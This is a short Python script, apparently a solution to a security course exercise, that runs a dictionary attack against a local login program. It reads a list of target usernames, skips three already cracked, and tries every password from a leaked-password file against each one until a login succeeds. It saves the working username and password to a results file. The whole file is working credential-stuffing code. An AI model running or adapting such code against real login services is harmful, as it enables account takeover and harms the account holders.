from datetime import datetime
import subprocess

ALREADY_FOUND = {
    "ForestPurpleFalcon522",
    "SkyRedFalcon914",
    "MountainPurpleShark585"
}

def find():
    # Load gang members
    with open("gang", "r", encoding="utf-8") as f:
        gang = [x.strip() for x in f if x.strip()]

    # Remove previously cracked users
    gang = [user for user in gang if user not in ALREADY_FOUND]

    # Open output file (optional but useful)
    with open("results_q4.txt", "w", encoding="utf-8") as out:

        # Stream leaked passwords
        with open("PwnedPWfile", "r", encoding="utf-8") as f:
            for line in f:
                pw = line.strip()
                if not pw:
                    continue

                for user in gang:
                    res = subprocess.run(
                        ["python3", "Login.pyc", user, pw],
                        capture_output=True,
                        text=True
                    )

                    if "Login successful" in res.stdout:
                        print("SUCCESS FOUND")
                        print("User:", user)
                        print("Password:", pw)
                        print()

                        out.write(f"{user} {pw}\n")
                        out.flush()

                        return  # Stop immediately

def main():
    print("Start:", datetime.now())
    find()
    print("End:", datetime.now())

if __name__ == "__main__":
    main()